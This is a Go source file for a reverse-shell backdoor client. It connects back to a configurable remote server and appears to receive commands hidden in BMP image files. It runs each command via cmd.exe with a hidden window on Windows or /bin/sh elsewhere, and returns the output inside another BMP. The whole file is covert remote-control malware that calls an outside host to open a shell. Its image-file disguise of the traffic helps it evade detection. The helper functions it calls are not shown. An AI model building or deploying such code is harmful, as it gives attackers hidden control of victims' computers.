package main

import (
	"flag"
	"net"
	"os/exec"
	"runtime"
	"syscall"
	"time"
)

var cmd *exec.Cmd

func main() {
	server := flag.String("server", "127.0.0.1", "your remote server")
	port := flag.String("port", "1337", "your server's port")
	flag.Parse()

	for {
		conn, err := net.Dial("tcp", *server+":"+*port)
		if err != nil {
			time.Sleep(5 * time.Second)
		} else {
			for {
				// save client_recv.bmp
				err = recv(conn, "client_recv.bmp")
				if err != nil {
					return
				}

				// read payload from client_recv.bmp
				payload, err := read("client_recv.bmp")
				if err != nil {
					return
				}
				switch runtime.GOOS {
				case "windows":
					cmd = exec.Command("cmd.exe", "/C", payload)
					cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
				default:
					cmd = exec.Command("/bin/sh", "-c", payload)
				}
				out, _ := cmd.Output()

				// write output to client_send.bmp
				err = write(string(out), "client_send.bmp")
				if err != nil {
					return
				}

				// send client_send.bmp
				err = send(conn, "client_send.bmp")
				if err != nil {
					return
				}
			}
		}
	}
}
